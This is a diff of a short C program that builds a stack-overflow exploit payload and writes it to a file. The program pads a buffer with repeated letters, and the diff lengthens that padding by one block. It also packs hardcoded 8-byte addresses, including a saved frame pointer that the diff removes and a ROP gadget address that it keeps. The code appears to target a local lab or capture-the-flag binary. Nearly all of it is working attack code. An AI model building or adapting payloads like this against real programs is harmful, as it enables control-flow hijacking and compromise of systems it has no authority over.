@@ -7,10 +7,8 @@ char* insert8Bytes(long long num, char* curBuf) {
 	for(int temp=0;temp<8;temp++) {
 		char msb = (num & 0xFF);
 		*(curBuf++) = msb;
-		printf("%p 0x%02X\n", num,  (unsigned int)(msb));
 		num >>= 8;
 	}
-	printf("\n");
 	return curBuf;
 }
 
@@ -19,16 +17,12 @@ int main() {
 	FILE *fp = fopen("stat_fmt.txt", "w");
 
 	char *curBuf = bigBuffer;
-	for(int temp='a';temp<'k';temp++) {
+	for(int temp='a';temp<'l';temp++) {
 
 		for(int temp2 = 0; temp2<8;temp2++) {
 			*(curBuf++) = temp;
 		}
 	}
-
-
-	long long savedEbp = 0x7fffffffdeb0;
-	curBuf = insert8Bytes(savedEbp, curBuf);
 
 
 	long long rdpGadget = 0x7FFFF79E7B6A;
